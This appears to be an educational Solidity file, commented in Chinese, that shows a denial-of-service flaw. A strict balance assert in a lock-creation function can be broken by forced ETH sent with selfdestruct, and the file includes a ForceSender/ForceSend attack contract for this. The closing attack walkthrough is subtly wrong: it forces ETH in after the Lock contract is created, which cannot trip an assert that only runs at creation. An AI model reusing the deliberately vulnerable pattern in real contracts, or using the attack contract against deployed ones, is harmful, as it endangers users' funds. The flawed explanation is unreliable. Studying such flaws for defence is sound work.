pragma solidity >=0.8.0;
// SPDX-License-Identifier: UNLICENSED

// 本範例展示了一個 Improper Locking 漏洞，漏洞重點在於 assert(address(lockAddr).balance == msg.value) 的驗證，
// 攻擊者可利用強制轉帳 (selfdestruct) 的方式，將額外 ETH 轉入 Lock 合約，導致 assert 條件不成立。

contract Lock {
    address public owner;
    uint256 public unlockTime;

    // 構造函式，接收 ETH 及設定擁有者和解鎖時間
    constructor(address _owner, uint256 _unlockTime) payable {
        owner = _owner;
        unlockTime = _unlockTime;
    }

    // 接收 Ether 的 fallback
    receive() external payable {}
}

contract LockContract {
    event Locked(address indexed owner, uint256 amount, Lock lockAddr, bytes edgewareAddr, bool isValidator, uint256 timestamp);

    modifier didStart() {
        // 假設合約操作已開始
        _;
    }

    modifier didNotEnd() {
        // 假設合約操作尚未結束
        _;
    }

    // 簡單計算解鎖時間 (此示例僅為展示用途)
    function unlockTimeForTerm(uint256 term) public view returns (uint256) {
        return block.timestamp + term;
    }

    // 漏洞函式 lock
    function lock(uint256 term, bytes calldata edgewareAddr, bool isValidator)
        external
        payable
        didStart
        didNotEnd
    {
        uint256 eth = msg.value;
        address owner = msg.sender;
        uint256 unlockTime = unlockTimeForTerm(term);
        
        // 建立 ETH 鎖定合約
        Lock lockAddr = (new Lock){value: eth}(owner, unlockTime);

        // 漏洞重點：檢查 Lock 合約餘額必須等於傳入數值，但未防範額外 ETH 被強制轉入
        assert(address(lockAddr).balance == msg.value); // BUG
        
        emit Locked(owner, eth, lockAddr, edgewareAddr, isValidator, block.timestamp);
    }
}

// 攻擊合約：利用 selfdestruct 強制轉入額外 ETH 至目標 Lock 合約，觸發 assert 檢查失敗
contract ForceSender {
    // 注意：ForceSend 合約的 constructor 改為 payable 以允許傳入 ETH
    function attack(address payable target) external payable {
        ForceSend temp = new ForceSend{value: msg.value}();
        temp.kill(target);
    }
}

contract ForceSend {
    // 將 constructor 標記為 payable 以允許在部署時傳入 ETH
    constructor() payable {}

    // 函式透過 selfdestruct 將合約內 ETH 強制轉入 target
    function kill(address payable target) public {
        selfdestruct(target);
    }
}

/*
使用範例 (攻擊流程說明):
1. 攻擊者呼叫 LockContract.lock 建立 Lock 合約，並傳入一定數量的 ETH。
2. 接著攻擊者呼叫 ForceSender.attack，針對剛建立的 Lock 合約傳入額外 ETH，利用 selfdestruct 將 ETH 強制轉入。
3. 由於 Lock 合約的餘額超過原本傳入的 msg.value，assert(address(lockAddr).balance == msg.value) 將失敗，產生錯誤。
*/